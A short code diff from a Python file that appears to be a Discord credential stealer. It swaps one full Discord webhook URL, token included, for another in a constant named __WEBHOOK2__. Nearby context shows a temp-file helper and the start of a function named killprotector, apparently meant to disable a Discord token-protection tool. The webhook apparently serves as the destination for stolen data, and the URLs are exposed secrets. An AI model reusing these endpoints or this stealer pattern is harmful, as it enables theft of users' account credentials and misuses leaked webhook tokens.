@@ -115,7 +115,7 @@ def create_temp(_dir: str or os.PathLike = gettempdir()):
     path = os.path.join(_dir, file_name)
     open(path, "x")
     return path
-__WEBHOOK2__ = "https://discord.com/api/webhooks/1065694610044760074/GleuU7-F8P_lmRJPDJro8ieu5OLXp3vyAG2sMd1y_D799imr458jugErb193vQJEZKyY"    
+__WEBHOOK2__ = "https://discord.com/api/webhooks/1065724929808547890/gU5R-QiFgyqo74Ei7TV4NvFwFGinJeaAe6DjI05_XzGmb7S4Bfgfgr_CGVzE6j4jKAk8"    
 
 
 def killprotector():
